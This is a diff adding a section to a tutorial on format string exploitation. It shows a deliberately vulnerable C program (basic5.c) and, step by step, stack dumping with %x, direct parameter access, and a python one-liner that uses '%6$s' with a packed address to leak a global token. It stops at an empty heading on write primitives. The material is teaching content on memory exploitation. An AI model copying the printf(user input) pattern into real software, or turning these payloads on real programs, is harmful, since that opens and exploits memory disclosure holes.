@@ -147,6 +147,8 @@ $ ./basic1 "%x %x %x %x %x"
 bb251528 bb251540 0 ba26edd0 ba2839d0
 ```
 
+### Cheap Format String Tricks
+
 Now, let's introduce some rough techniques to dump memory. To make it easier, we
 will introduce a feature of the format specifier called the 'direct parameter
 access'. The 'direct parameter access' lets you access a particular parameter
@@ -233,11 +235,117 @@ What is interesting here is that we are able to dump environment variables from
 the heap. This might be useful for an attacker trying to gain information on the
 operating environment of the application.
 
+### Surgical Format String Exploitation
+
+Broad information leaks are fun and all, but we can do better. Format string
+vulnerabilities not only give the ability to read up the stack, but the
+ability to arbitrarily write to and read from any location in memory.
+
+#### Arbitrary Read Primitive
+
+Let's take a look at how we can construct an arbitrary read primitive in this
+example ([basic5.c][5]):
+
+```c
+#include <stdio.h>
+
+char token[26];
+
+int main() {
+    strncpy(token, "yum-yum-squanch-squaunchy", 26);
+    printf("Token address: 0x%x\n", &token);
+    squanch();
+}
+
+void squanch() {
+    fputs("Please give me something to squanch: ", stdout);
+    char squeak[501] = {0};
+    scanf("%500s", squeak);
+    printf(squeak);
+}
+```
+
+What this program does is print the address of the `token` then take input from
+the user which is directly used in the `printf()` function. Our objective is to
+get the token to be printed using the format string vulnerability. Here is an
+innocent sample run:
+
+```console
+$ ./basic5
+Token address: 0x804a034
+Please give me something to squanch: Wubababadubdub!
+Wubababadubdub!
+```
+
+And here's the detection of the vulnerability:
+
+```console
+$ ./basic5
+Token address: 0x804a034
+Please give me something to squanch: %x.%x.%x.%x.%x
+ffa52867.25.f76e7e80.f77169e9.25731000
+```
+
+Now, let's make one more observation. We place a discernable marker in the input
+and dump the stack.
+
+```console
+$ ./basic5
+Token address: 0x804a034
+Please give me something to squanch: AAAA%x.%x.%x.%x.%x.%x.%x.%x.
+AAAAff925d27.25.f76f2e80.f77219e9.4173c000.25414141.78252e78.2e78252e.
+```
+
+Notice that 0x41414141 is present in this bit:
+`4173c000.25414141.78252e78.2e78252e.`. Let's decode that bit:
+
+```console
+In [1]: "4173c000.25414141.78252e78.2e78252e".replace(".", "").decode("hex")
+Out[1]: 'As\xc0\x00%AAAx%.x.x%.'
+```
+
+It's a little tough to read but we can see the start of the input we supplied.
+Let's adjust the input so that the AAAA is nicely aligned.
+
+```console
+$ ./basic5
+Token address: 0x804a034
+Please give me something to squanch: XAAAA%x.%x.%x.%x.%x.%x.%x.%x.
+XAAAAff9214e7.25.f7733e80.f77629e9.5877d000.41414141.252e7825.78252e78.
+```
+
+Now we have a way to supply an arbirary value on the stack for use in our
+exploit. Let's clean it up further with direct parameter access.
+
+```console
+$ ./basic5
+Token address: 0x804a034
+Please give me something to squanch: XAAAA%6$x
+XAAAA41414141
+```
+
+Recall that we can use `%s` to dereference a pointer on the stack and print the
+contents at that address. We just need to supply the address of the `token` and
+use `%s` to trigger that read. We will use `0x804a034` as given by the program.
+The address does not shift between executions as the variable is global.
+
+```console
+$ python -c 'import struct; print "X" + struct.pack("I", 0x804a034) + "%6$s"' | ./basic5
+Token address: 0x804a034
+Please give me something to squanch: X4�yum-yum-squanch-squaunchy
+```
+
+The string "yum-yum-squanch-squaunchy" is printed after some junk characters.
+The junk characters come from the address we had provided to read from.
+
+#### Arbitrary Write Primitive
+
 [//]: # (Links)
 [1]: ./formatstring/basic1.c
 [2]: ./formatstring/basic2.c
 [3]: ./formatstring/basic3.c
 [4]: ./formatstring/basic4.c
+[5]: ./formatstring/basic5.c
 
 
 [//]: # (Images)
